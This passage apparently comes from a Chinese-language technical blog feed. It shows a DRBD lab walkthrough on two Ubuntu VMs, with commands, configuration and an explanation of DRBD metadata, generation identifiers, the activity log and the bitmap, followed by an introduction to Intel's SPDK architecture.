<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu2:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop3                       7:3    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop4                       7:4    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop5                       7:5    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">loop6                       7:6    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop7                       7:7    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   32G  0 disk</span><br><span class="line">└─drbd2                   147:2    0   30G  1 disk</span><br><span class="line">sdc                         8:32   0   22G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br></pre></td></tr></table></figure>

<p>使用<code>drbdadm resize r1</code>完成对<code>r1</code>资源的扩容操作。</p>
<h1 id="硬盘存在有效数据情况"><a href="#硬盘存在有效数据情况" class="headerlink" title="硬盘存在有效数据情况"></a>硬盘存在有效数据情况</h1><p>ubu1和ubu2上分别创建了两个硬盘，一个20G存drbd的meta-data，一个30G用于存drbd的数据。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ cat r2.res</span><br><span class="line">resource r2 &#123;</span><br><span class="line">  on ubu1 &#123;</span><br><span class="line">    device    /dev/drbd3;</span><br><span class="line">    disk  /dev/sdc;</span><br><span class="line">    address   192.168.64.2:7793;</span><br><span class="line">    meta-disk /dev/sdb;</span><br><span class="line">  &#125;</span><br><span class="line">  on ubu2 &#123;</span><br><span class="line">    device    /dev/drbd3;</span><br><span class="line">    disk  /dev/sdb;</span><br><span class="line">    address   192.168.64.4:7793;</span><br><span class="line">    meta-disk /dev/sdc;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先对ubu1上的数据盘<code>sdc</code>创建文件系统，并写入数据。然后再做drbd pair。</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ sudo mkfs.ext4 /dev/sdc</span><br><span class="line">mke2fs 1.45.5 (07-Jan-2020)</span><br><span class="line">Discarding device blocks: done</span><br><span class="line">Creating filesystem with 8126464 4k blocks and 2031616 inodes</span><br><span class="line">Filesystem UUID: 656f1b08-77a2-4488-acb1-f25ff616b257</span><br><span class="line">Superblock backups stored on blocks:</span><br><span class="line">    32768, 98304, 163840, 229376, 294912, 819200, 884736, 1605632, 2654208,</span><br><span class="line">    4096000, 7962624</span><br><span class="line"></span><br><span class="line">Allocating group tables: done</span><br><span class="line">Writing inode tables: done</span><br><span class="line">Creating journal (32768 blocks): done</span><br><span class="line">Writing superblocks and filesystem accounting information: done</span><br><span class="line"></span><br><span class="line">bob@ubu1:~/drbd_res$ sudo mount /dev/sdc /mnt/</span><br><span class="line">bob@ubu1:~/drbd_res$ echo &quot;Hi, bob&quot; &gt; /mnt/bob.txt</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo umount /mnt</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm create-md r2</span><br><span class="line">md_offset 0</span><br><span class="line">al_offset 4096</span><br><span class="line">bm_offset 36864</span><br><span class="line"></span><br><span class="line">Found some data</span><br><span class="line"></span><br><span class="line"> ==&gt; This might destroy existing data! &lt;==</span><br><span class="line"></span><br><span class="line">Do you want to proceed?</span><br><span class="line">[need to type &#x27;yes&#x27; to confirm] yes</span><br><span class="line"></span><br><span class="line">initializing activity log</span><br><span class="line">initializing bitmap (672 KB) to all zero</span><br><span class="line">Writing meta data...</span><br><span class="line">New drbd meta data block successfully created.</span><br><span class="line">success</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm up r2</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo drbdadm primary --force r2</span><br><span class="line">bob@ubu1:~/drbd_res$ cat /proc/drbd</span><br><span class="line">version: 8.4.11 (api:1/proto:86-101)</span><br><span class="line">srcversion: B438804C5AE8C84C95D0411</span><br><span class="line"></span><br><span class="line"> 1: cs:Connected ro:Secondary/Secondary ds:UpToDate/UpToDate C r-----</span><br><span class="line">    ns:0 nr:0 dw:0 dr:0 al:0 bm:0 lo:0 pe:0 ua:0 ap:0 ep:1 wo:f oos:0</span><br><span class="line"></span><br><span class="line"> 3: cs:SyncSource ro:Primary/Secondary ds:UpToDate/Inconsistent C r-----</span><br><span class="line">    ns:130656 nr:0 dw:0 dr:131328 al:8 bm:0 lo:0 pe:4 ua:0 ap:0 ep:1 wo:f oos:32376640</span><br><span class="line">        [&gt;....................] sync&#x27;ed:  0.5% (31616/31744)M</span><br><span class="line">        finish: 1:14:56 speed: 7,176 (7,176) K/sec</span><br></pre></td></tr></table></figure>

<p>ubu2:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu2:~$ sudo drbdadm create-md r2</span><br><span class="line">initializing activity log</span><br><span class="line">initializing bitmap (704 KB) to all zero</span><br><span class="line">Writing meta data...</span><br><span class="line">New drbd meta data block successfully created.</span><br><span class="line">success</span><br></pre></td></tr></table></figure>

<p>此时drbd pair已经创建好了，<code>drbd3</code>也已经创建完成，直接挂载<code>drbd3</code>查看数据是否依然还在</p>
<p>ubu1:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bob@ubu1:~/drbd_res$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT</span><br><span class="line">loop0                       7:0    0 49.1M  1 loop /snap/core18/2681</span><br><span class="line">loop1                       7:1    0 49.1M  1 loop /snap/core18/2701</span><br><span class="line">loop2                       7:2    0 43.2M  1 loop /snap/snapd/17954</span><br><span class="line">loop3                       7:3    0 57.5M  1 loop /snap/core20/1332</span><br><span class="line">loop4                       7:4    0 43.2M  1 loop /snap/snapd/18363</span><br><span class="line">loop5                       7:5    0 60.7M  1 loop /snap/lxd/21843</span><br><span class="line">loop6                       7:6    0 91.9M  1 loop /snap/lxd/24065</span><br><span class="line">loop7                       7:7    0 59.1M  1 loop /snap/core20/1826</span><br><span class="line">sda                         8:0    0   20G  0 disk</span><br><span class="line">└─drbd1                   147:1    0   20G  1 disk</span><br><span class="line">sdb                         8:16   0   21G  0 disk</span><br><span class="line">└─drbd3                   147:3    0   31G  0 disk</span><br><span class="line">sdc                         8:32   0   31G  0 disk</span><br><span class="line">└─drbd3                   147:3    0   31G  0 disk</span><br><span class="line">sr0                        11:0    1  1.1G  0 rom</span><br><span class="line">vda                       252:0    0  100G  0 disk</span><br><span class="line">├─vda1                    252:1    0  512M  0 part /boot/efi</span><br><span class="line">├─vda2                    252:2    0    1G  0 part /boot</span><br><span class="line">└─vda3                    252:3    0 98.5G  0 part</span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0 49.3G  0 lvm  /</span><br><span class="line">bob@ubu1:~/drbd_res$ sudo mount /dev/drbd3 /mnt/</span><br><span class="line">bob@ubu1:~/drbd_res$ ls /mnt/</span><br><span class="line">bob.txt  lost+found</span><br><span class="line">bob@ubu1:~/drbd_res$ cat /mnt/bob.txt</span><br><span class="line">Hi, Bob</span><br></pre></td></tr></table></figure>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>DRBD（Distributed Replicated Block Device）是一个基于内核模块的高可用性（HA）软件，它在两个或多个节点之间复制块设备数据，使得在其中一个节点发生故障时，其他节点可以接管工作并保持服务可用性。</p>
<p><img src="/images/drbd/drbd-in-kernel.png" alt="drbd-in-kernel.png"></p>
<p>DRBD的工作原理：</p>
<ol>
<li>DRBD将每个块设备划分为数据和元数据两个区域。元数据包含块设备的状态信息和同步状态，而数据包含实际的用户数据。</li>
<li>DRBD使用一个专用的网络通信通道（通常是TCP &#x2F; IP）来在节点之间传输数据。当发生写操作时，数据被写入本地节点的数据区域，并通过网络传输到远程节点，然后在远程节点上写入远程节点的数据区域。</li>
<li>DRBD还使用一种名为“生成标识符”（Generation Identifiers）的机制来检测节点间的数据同步状态。每个生成标识符对应一个生成版本，节点在进行数据同步时，使用生成标识符来判断版本是否相同。</li>
<li>DRBD提供了多种数据同步策略，例如全同步，增量同步和快速同步，以便在不同的应用场景下获得最佳的性能和数据完整性。</li>
<li>DRBD支持不同的工作模式，如协议A和协议C，用于适应不同的应用需求。协议A用于异步复制，适用于数据传输速度较慢的场景，而协议C则用于同步复制，适用于对数据完整性有较高要求的场景。</li>
</ol>
<h2 id="DRBD-Metadata"><a href="#DRBD-Metadata" class="headerlink" title="DRBD Metadata"></a>DRBD Metadata</h2><p>DRBD元数据包括：</p>
<ul>
<li>DRBD容量</li>
<li>GI(Generation Identifiers)</li>
<li>Activity Log</li>
<li>Quick-sync Bitmap</li>
</ul>
<h3 id="Internal-meta-data"><a href="#Internal-meta-data" class="headerlink" title="Internal meta data"></a>Internal meta data</h3><p>资源配置成<code>internal</code>方式存储元数据，这意味着元数据将与底层实际存储的数据放在一起。它通过在设备末尾设置一个区域来专门存储元数据。</p>
<ul>
<li><p>优点<br>  由于元数据与实际数据密不可分，因此在硬盘发生故障时，管理员不需要采取任何特殊措施。元数据将随着实际数据丢失，并与实际数据一起恢复。</p>
</li>
<li><p>缺点<br>  如果底层设备是单个物理硬盘（而不是 RAID 集），则内部元数据可能会对写入吞吐量产生负面影响。应用程序发起的写请求的性能可能会触发 DRBD 中元数据的更新。如果元数据存储在同一磁盘上，则写操作可能会导致硬盘的写入&#x2F;读取头产生两次额外的移动。</p>
</li>
</ul>
<p>如果您计划将内部元数据与已经有需要保留的数据的现有底层设备一起使用，您必须考虑 DRBD 元数据所需的空间。另外，在创建 DRBD 资源时，新创建的元数据可能会覆盖底层设备末尾的数据，从而可能破坏现有的文件。<br>为了避免这种情况发生，有三种解决方法：</p>
<ol>
<li>扩容底层硬盘，保证其有足够的容量存储元数据。</li>
<li>缩小已存在于底层硬盘的数据的大小，这需要文件系统的支持。</li>
<li>使用external meta data 替代。</li>
</ol>
<h3 id="External-meta-data"><a href="#External-meta-data" class="headerlink" title="External meta data"></a>External meta data</h3><p>External meta data 只是简单地存储在一个与包含生产数据的设备不同的、专用的块设备中。</p>
<ul>
<li><p>优势<br>  对于某些写操作，使用外部元数据可以产生略微改善的延迟行为。</p>
</li>
<li><p>缺点<br>  元数据与实际生产数据并不密不可分。这意味着，在硬件故障仅破坏生产数据（但不破坏 DRBD 元数据）的情况下，需要手动干预，以实现从存活的节点对新替换磁盘的全面数据同步。</p>
</li>
</ul>
<p>如果满足以下所有条件，使用外部元数据也是唯一可行的选择，您正在使用 DRBD 复制一个已经包含您希望保留的数据的现有设备，且该现有设备不支持扩大容量，且该设备上的现有文件系统不支持缩小容量。</p>
<h2 id="Generation-Identifiers"><a href="#Generation-Identifiers" class="headerlink" title="Generation Identifiers"></a>Generation Identifiers</h2><p>DRBD 使用Generation Identifiers（GIs）来标识“复制数据代”。数据同步是基于GI实现的。GI是一个递增的整数，每个DRBD设备都有自己的GI计数器，用于记录本地和远程节点上最新的GI。当DRBD设备从远程节点读取数据时，它会比较本地和远程节点上的GI值。如果本地GI值低于远程节点上的GI值，那么DRBD设备会自动启动数据同步，将远程节点上的数据复制到本地节点上。</p>
<p>该GI在DRBD的内部机制如下：</p>
<ul>
<li>确定这两个节点是否实际上是同一集群的成员（而不是意外连接的两个节点）</li>
<li>确定后台重新同步的方向（如果有必要）</li>
<li>确定是否需要进行完全重新同步或是否仅需要进行部分重新同步</li>
<li>标识脑裂</li>
</ul>
<p>分裂大脑是指当DRBD设备与另一个节点失去联系时发生的问题。在这种情况下，每个节点都可能认为自己是唯一的“活动”节点，并开始独立地写入数据。当两个节点再次连接时，它们可能会发现它们的数据不同步。GI用于解决这个问题。当两个节点重新连接时，它们比较彼此的GI值。如果GI值相同，则两个节点处于相同的“代”，可以继续同步数据。如果GI值不同，则两个节点处于不同的“代”，需要手动解决分裂大脑问题，通常需要将其中一个节点上的数据进行回滚。</p>
<h3 id="数据代-Data-generations"><a href="#数据代-Data-generations" class="headerlink" title="数据代(Data generations)"></a>数据代(Data generations)</h3><p>以下情况下标记新的数据生成开始：</p>
<ol>
<li>初始设备全量同步时</li>
<li>断开的资源切换到主要角色时</li>
<li>资源在主要角色下线时</li>
</ol>
<p>因此，我们可以总结出，每当资源处于已连接的连接状态，并且两个节点的磁盘状态都为UpToDate时，两个节点上的当前数据生成相同。<br>反之亦然。请注意，当前实现使用最低位来编码节点的角色（主&#x2F;辅）。因此，即使被认为具有相同的数据生成，不同节点上的最低位也可能不同。</p>
<p>每个新的数据生成由8字节的通用唯一标识符（UUID）标识。</p>
<h3 id="GI元组-The-generation-identifier-tuple"><a href="#GI元组-The-generation-identifier-tuple" class="headerlink" title="GI元组(The generation identifier tuple)"></a>GI元组(The generation identifier tuple)</h3><p>BD在本地资源元数据中保存了有关当前和历史数据生成的四个信息：</p>
<ol>
<li>当前UUID (Current UUID)<br> 这是从本地节点的视角看到的当前数据生成的生成标识符。当资源已连接并且同步完成时，当前UUID在节点之间是相同的。</li>
<li>位图UUID (Bitmap UUID)<br> 这是用于跟踪在断开连接模式下磁盘同步位图中的更改的生成的UUID。与磁盘同步位图本身一样，该标识符仅在断开连接模式下才相关。如果资源已连接，则此UUID始终为空（零）。</li>
<li>两个历史UUID (Historical UUIDs)<br> 它们是当前数据生成之前的两个数据生成的标识符。</li>
</ol>
<h3 id="GI如何变化"><a href="#GI如何变化" class="headerlink" title="GI如何变化"></a>GI如何变化</h3><h4 id="Start-of-a-new-data-generation"><a href="#Start-of-a-new-data-generation" class="headerlink" title="Start of a new data generation"></a>Start of a new data generation</h4><p><img src="/images/drbd/gi-changes-newgen.png" alt="gi-changes-newgen.png"></p>
<p>当一个节点（无论是由于网络故障还是手动干预）失去与其对等节点的连接时，DRBD 以下方式修改其本地生成GI：</p>
<ol>
<li>为新的数据生成创建一个新的 UUID。这成为主节点的新的 current UUID。</li>
<li>用之前的current UUID替换现在的Bitmap UUID，因此它成为主节点的新的Bitmap UUID。</li>
<li>在次要节点上，GI元组保持不变</li>
</ol>
<h4 id="Start-of-re-synchronization"><a href="#Start-of-re-synchronization" class="headerlink" title="Start of re-synchronization"></a>Start of re-synchronization</h4><p><img src="/images/drbd/gi-changes-syncstart.png" alt="gi-changes-syncstart.png"></p>
<p>在重新同步初始化时，DRBD在本地GI执行这些修改：</p>
<ol>
<li>同步源上的Current UUID保持不变。</li>
<li>同步源上的Bitmap UUID轮换到第一个历史UUID。</li>
<li>在同步源上生成一个新的Bitmap UUID。</li>
<li>此UUID成为同步目标上的新Current UUID。</li>
<li>同步目标上的Bitmap UUID和历史UUID保持不变。</li>
</ol>
<h4 id="Completion-of-re-synchronization"><a href="#Completion-of-re-synchronization" class="headerlink" title="Completion of re-synchronization"></a>Completion of re-synchronization</h4><p><img src="/images/drbd/gi-changes-synccomplete.png" alt="gi-changes-synccomplete.png"></p>
<p>当重新同步完成，需要执行如下步骤：</p>
<ol>
<li>同步源上的Current UUID保持不变</li>
<li>同步源上的Bitmap UUID轮转到第一个历史UUID，第一历史UUID替换第二历史UUID（任何已存在的第二历史UUID将被丢弃）</li>
<li>同步源上的Bitmap UUID将被清空（清零）</li>
<li>同步目标采用来自同步源的整个GI元组</li>
</ol>
<h3 id="DRBD如何使用GI"><a href="#DRBD如何使用GI" class="headerlink" title="DRBD如何使用GI"></a>DRBD如何使用GI</h3><p>当两个节点之间建立连接时，它们会交换当前可用的生成标识符，并相应地进行操作。可能有许多可能的结果：</p>
<ul>
<li>两个节点的Current UUID都为空<br>  本地节点检测到它自己和对等节点的当前UUID都为空。这是刚刚配置好的资源的正常情况，尚未启动初始完全同步。不会进行同步，必须手动启动。</li>
<li>一个节点的Current UUID为空<br>  本地节点检测到对等节点的Current UUID为空，而自己的不为空。这是刚刚配置好的资源的正常情况，初始全同步刚刚启动，本地节点被选为初始同步源。DRBD现在设置磁盘上同步位图中的所有位（意味着它认为整个设备不同步），并作为同步源开始同步。在相反的情况下（本地Current UUID为空，对等节点不为空），DRBD执行相同的步骤，只是本地节点变成同步目标。</li>
<li>Current UUID相等<br>  本地节点检测到其Current UUID和对等节点的Current UUID都不为空且相等。这是在资源处于从属角色时进入断开连接模式的资源的正常情况，且在断开连接期间没有在任一节点上进行晋升。不会进行同步，因为不需要同步。</li>
<li>Bitmap UUID与对等节点的Current UUID匹配<br>  本地节点检测到它的Bitmap UUID与对等节点的Current UUID匹配，而对等节点的Bitmap UUID为空。这是从属节点故障后的正常预期情况，本地节点处于主角色。这意味着对等节点在此期间从未变为主节点，并一直使用相同的数据生成基础。现在，DRBD会启动正常的后台重新同步，本地节点成为同步源。反之，如果本地节点检测到它的Bitmap UUID为空，并且对等节点的位图与本地节点的Current UUID匹配，那么这是本地节点故障后的正常预期情况。同样，DRBD现在启动正常的后台重新同步，本地节点成为同步目标。</li>
<li>Current UUID与对等节点的历史UUID匹配<br>  本地节点检测到它的Current UUID与对等节点的历史UUID之一匹配。这意味着尽管两个数据集共享一个共同的祖先，并且对等节点具有最新的数据，但在对等节点的位图中保留的信息已经过时且无法使用。因此，正常同步是不足够的。DRBD现在将整个设备标记为不同步，并启动完全后台重新同步，本地节点成为同步目标。在相反的情况（本地节点的历史 UUID 与对等节点的Current UUID匹配），DRBD 执行相同的步骤，只是本地节点成为同步源。</li>
<li>Bitmap UUID匹配，但Current UUID不匹配<br>  本地节点检测到其Current UUID与对等节点的Current UUID不同，但Bitmap UUID匹配。这是脑裂的情况，但数据生成具有相同的父级。这意味着如果已配置，DRBD 将调用脑裂自动恢复策略。否则，DRBD将断开连接并等待手动脑裂解决。</li>
<li>Current UUID 和Bitmap UUID 都不匹配<br>  本地节点检测到其Current UUID与对等节点的Current UUID不同，且Bitmap UUID也不匹配。这是不相关祖先代的脑裂，因此即使配置了自动恢复策略，也是无用的。DRBD断开连接并等待手动脑裂解决。</li>
<li>没有 UUID 匹配<br>  如果DRBD未能在两个节点的GI元组中检测到任何匹配的元素，它会记录关于不相关数据的警告并断开连接。这是DRBD防止意外连接两个之前从未听说过对方的集群节点的安全保障。</li>
</ul>
<h2 id="Activity-Log"><a href="#Activity-Log" class="headerlink" title="Activity Log"></a>Activity Log</h2><p>在一个写操作期间，DRBD将写操作转发到本地后备块设备，但也通过网络发送数据块。这两个操作实际上都是同时进行的。随机的时序行为可能会导致这样一种情况：写操作已经完成，但网络传输尚未完成。如果此时活动节点失败并启动故障转移，则这个数据块在节点之间是不同步的——在崩溃之前已在失败的节点上写入，但复制尚未完成。因此，当节点最终恢复时，这个块必须在随后的同步期间从数据集中删除。否则，崩溃的节点将“领先于”存活的节点，这将违反复制存储的“全部或无”的原则。这不仅是DRBD所特有的问题，在实际上所有的复制存储配置中都存在这个问题。许多其他存储解决方案（就像DRBD本身在0.7版本之前）要求在活动节点失败后，该节点必须在恢复后进行完全同步。</p>
<p>DRBD自0.7版本之后。在元数据区域存储活动日志（Activity Log）跟踪了“最近”已经写入的那些块。俗称，这些区域被称为热区段。如果一个临时失败的处于活动模式的节点进行同步，只有在AL中突出显示的那些热区段需要进行同步，而不需要同步整个设备。这大大减少了在活动节点崩溃后进行同步所需的时间。</p>
<h3 id="Activity-extents"><a href="#Activity-extents" class="headerlink" title="Activity extents"></a>Activity extents</h3><p>Activity Log由多个Activity extents组成。可通过资源配置文件中的<code>activity-log-size</code>参数进行配置，该参数表示Active extents数量，必须是2的幂，且范围通常在16到4096之间。每个Activity extents大小为4MiB。</p>
<p>保持大的活动日志可以提高写入吞吐量。每次激活新的扩展时，一个旧的扩展将被重置为非活动状态。这种转换需要向元数据区域写入一个操作。如果活动扩展数很高，旧的活动扩展很少被交换出，从而减少了元数据写操作，从而提高了性能。</p>
<p>保持小的活动日志可以缩短在主节点失败和随后的恢复后的同步时间。</p>
<h3 id="选择一个合适Activity-Log-Size"><a href="#选择一个合适Activity-Log-Size" class="headerlink" title="选择一个合适Activity Log Size"></a>选择一个合适Activity Log Size</h3><p><img src="/images/drbd/al-extents.png" alt="al-extents.png"></p>
<ul>
<li><code>R</code>是同步速度（单位：MB&#x2F;s）</li>
<li><code>tsync</code>是同步时间（单位：s）</li>
<li><code>E</code>是Active extents数量</li>
</ul>
<p>DRBD是可以控制同步带宽的，使用<code>net</code>配置选项来控制DRBD在网络上使用的带宽。这个选项可以在DRBD配置文件中的全局段中设置，也可以在资源段中设置。</p>
<p>eg:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">global &#123;</span><br><span class="line">    ...</span><br><span class="line">    net &#123;</span><br><span class="line">        max-rate 1G;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>max-rate</code>选项将同步带宽限制为1Gbit&#x2F;s。您可以将该选项设置为所需的速率，以控制DRBD在网络上使用的带宽。</p>
<h2 id="Quick-sync-Bitmap"><a href="#Quick-sync-Bitmap" class="headerlink" title="Quick-sync Bitmap"></a>Quick-sync Bitmap</h2><p>Quick-sync Bitmap是 DRBD 在每个资源上使用的内部数据结构，用于跟踪块是否同步（在两个节点上相同）或不同步。它仅在资源处于断开模式时才相关。在Quick-sync Bitmap中，一个比特表示一个 4KiB 的磁盘数据块。如果该位被清除，则意味着相应的块仍与对等节点同步。这意味着该块自断开连接以来尚未被写入。相反，如果该位被设置，则意味着该块已被修改，并且在连接再次可用时需要重新同步。</p>
<p>当 DRBD 检测到断开的设备上的写 I&#x2F;O 时，因此开始在Quick-sync Bitmap中设置位，它在 RAM 中执行此操作，从而避免了昂贵的同步元数据 I&#x2F;O 操作。只有当相应的块变得“冷”（从活动日志中过期）时，DRBD 才会在Quick-sync Bitmap的磁盘表示中进行适当的修改。同样，如果在断开连接的同时手动关闭了剩余节点上的资源，则 DRBD 将完整的Quick-sync Bitmap刷新到持久存储中。当对等节点恢复或重新建立连接时，DRBD 将结合两个节点的位图信息，确定必须重新同步的总数据集。同时，DRBD 检查生成标识符以确定同步方向。</p>
<p>充当同步源的节点然后将协商好的块传输到对等节点，在同步目标确认修改时清除同步位。如果重新同步现在被中断（例如，由于另一个网络故障），然后继续恢复，它将在离开时继续进行 - 当然，同时修改的任何其他块都将添加到重新同步数据集中。</p>
<h1 id="参考-鸣谢"><a href="#参考-鸣谢" class="headerlink" title="参考&amp;鸣谢"></a>参考&amp;鸣谢</h1><ul>
<li><a href="https://www.cnblogs.com/linuxprobe/p/5381538.html">一张图让你学会LVM</a></li>
<li><a href="https://linbit.com/drbd-user-guide/users-guide-drbd-8-4/#ch-internals">linbit</a></li>
<li><a href="https://chat.openai.com/">chatgpt</a></li>
</ul>
]]></content>
      <categories>
        <category>storage</category>
      </categories>
      <tags>
        <tag>drbd</tag>
      </tags>
  </entry>
  <entry>
    <title>SPDK简介</title>
    <url>/2020/11/17/storage/spdk-introduce/</url>
    <content><![CDATA[<p>SPDK（Storage Performance Development Kit）是Intel发布的存储性能开发工具集</p>
<p>用户使用现在的固态设备，比如Intel® SSD DC P3700 Series Non-Volatile Memory Express（NVMe）驱动，面临一个主要的挑战：因为吞吐量和延迟性能比传统的磁盘好太多，现在总的处理时间中，存储软件占用了更大的比例。换句话说，存储软件栈的性能和效率在整个存储系统中越来越重要。随着存储设备继续发展，它将面临远远超过正在使用的软件体系结构的风险（即存储设备受制于相关软件的不足而不能发挥全部性能）</p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ul>
<li>用户态运行<br>  避免内核上下文切换和中断将会节省大量的处理开销，允许更多的时钟周期被用来做实际的数据存储。无论存储算法（去冗，加密，压缩，空白块存储）多么复杂，浪费更少的时钟周期总是意味着更好的性能和延迟。这并不是说内核增加了不必要的开销；相反，内核增加了那些可能不适用于专用存储堆栈的通用计算用例的相关开销。SPDK的指导原则是通过消除每一处额外的软件开销来提供最少的延迟和最高的效率。</li>
<li>轮询模式取代中断模式（Polled Mode Drivers, PMDs）<br>  在传统的I&#x2F;O模型中，应用程序提交读写请求后睡眠，一旦I&#x2F;O完成，中断就会将其唤醒。PMDs的工作方式不同，应用程序提交读写请求后继续执行其他工作，以一定的时间间隔回头检查I&#x2F;O是否已经完成。这种方式避免了中断带来的延迟和开销，并使得应用程序提高了I&#x2F;O的效率。<br>  在机械盘时代，中断开销只占整个I&#x2F;O时间的一个很小的百分比，因此给系统带来了巨大的效率提升。然而，在固态设备的时代，持续引入更低延迟的持久化设备，中断开销成为了整个I&#x2F;O时间中不能被忽视的部分。这个问题在更低延迟的设备上只会越来越严重。系统已经能够每秒处理数百万个I&#x2F;O，所以消除数百万个事务的这种开销，能够快速地复制到多个内核中。数据包和数据块被立即分发，等待时间减小到最少，使得延迟更低，一致性延迟更多（抖动更少），吞吐量也得到提高。</li>
<li>无锁机制<br>  在IO路径上避免采用任何锁机制进行同步，降低时延并提升吞吐量</li>
</ul>
<h1 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h1><p><img src="/images/spdk/introduction-to-the-storage-performance-development-kit-spdk-fig2.png" alt="introduction-to-the-storage-performance-development-kit-spdk-fig2"></p>
<h3 id="Hardware-Drivers"><a href="#Hardware-Drivers" class="headerlink" title="Hardware Drivers"></a>Hardware Drivers</h3><h4 id="NVMe-Driver"><a href="#NVMe-Driver" class="headerlink" title="NVMe Driver"></a>NVMe Driver</h4><p>SPDK的基础组件，这个高优化无锁的驱动提供了高扩展性，高效性和高性能。</p>
<h4 id="Inter-QuickData-Technology"><a href="#Inter-QuickData-Technology" class="headerlink" title="Inter QuickData Technology"></a>Inter QuickData Technology</h4><p>Intel I&#x2F;O Acceleration Technology（Inter IOAT，英特尔I&#x2F;O加速技术），这是一种基于Xeon处理器平台上的copy offload引擎。通过提供用户空间访问，减少了DMA数据移动的阈值，允许对小尺寸I&#x2F;O或NTB的更好利用。</p>
<h3 id="Back-end-Block-Devices"><a href="#Back-end-Block-Devices" class="headerlink" title="Back-end Block Devices"></a>Back-end Block Devices</h3><h4 id="NVMe-oF-Initiator"><a href="#NVMe-oF-Initiator" class="headerlink" title="NVMe-oF Initiator"></a>NVMe-oF Initiator</h4><p>本地SPDK NVMe驱动和NVMe-oF启动器共享一套共同的API命令。这意味着，比如本地&#x2F;远程复制非常容易实现。</p>
<h4 id="Ceph-RADOS-Block-Device"><a href="#Ceph-RADOS-Block-Device" class="headerlink" title="Ceph RADOS Block Device"></a>Ceph RADOS Block Device</h4><p>Ceph RBD 成为SPDK的后端设备</p>
<h4 id="Blobstore-Block-Device"><a href="#Blobstore-Block-Device" class="headerlink" title="Blobstore Block Device"></a>Blobstore Block Device</h4><p>由SPDK Blobstore分配的块设备，是虚拟机或数据库可以与之交互的虚拟设备。这些设备得到SPDK基础架构的优势，意味着零拷贝和令人难以置信的可扩展性。</p>
<h4 id="Linux-AIO"><a href="#Linux-AIO" class="headerlink" title="Linux AIO"></a>Linux AIO</h4><p>允许SPDK与内核设备（比如机械硬盘）交互。</p>
<h3 id="Storage-Services"><a href="#Storage-Services" class="headerlink" title="Storage Services"></a>Storage Services</h3><h4 id="Block-Device-Abstration-Layer"><a href="#Block-Device-Abstration-Layer" class="headerlink" title="Block Device Abstration Layer"></a>Block Device Abstration Layer</h4><p>这种通用的块设备抽象是连接到各种不同设备驱动和块设备的存储协议的粘合剂。还在块层中提供灵活的API用于额外的用户功能（磁盘阵列，压缩，去冗等等）。</p>
<h4 id="Blobstore"><a href="#Blobstore" class="headerlink" title="Blobstore"></a>Blobstore</h4><p>为SPDK实现一个高精简的文件式语义（非POSIX）。这可以为数据库，容器，虚拟机或其他不依赖于大部分POSIX文件系统功能集（比如用户访问控制）的工作负载提供高性能基础。</p>
<h3 id="Storage-Protocols"><a href="#Storage-Protocols" class="headerlink" title="Storage Protocols"></a>Storage Protocols</h3><h4 id="iSCSI-Target"><a href="#iSCSI-Target" class="headerlink" title="iSCSI Target"></a>iSCSI Target</h4><p>建立了通过以太网的块流量规范，大约是内核LIO效率的两倍。现在的版本默认使用内核TCP&#x2F;IP协议栈。</p>
<h4 id="vhost-scsi-target"><a href="#vhost-scsi-target" class="headerlink" title="vhost-scsi target"></a>vhost-scsi target</h4><p>KVM&#x2F;QEMU的功能利用了SPDK NVMe驱动，使得访客虚拟机访问存储设备时延迟更低，使得I&#x2F;O密集型工作负载的整体CPU负载减低。</p>
<h4 id="NVMe-oF-Target"><a href="#NVMe-oF-Target" class="headerlink" title="NVMe-oF Target"></a>NVMe-oF Target</h4><p>实现了NVMe-oF规范。虽然这取决于RDMA硬件，NVMe-oF的目标可以为每个CPU核提供高达40Gbps的流量。</p>
<h1 id="应用方案"><a href="#应用方案" class="headerlink" title="应用方案"></a>应用方案</h1><p><img src="/images/spdk/spdk_component.png" alt="spdk_component"></p>
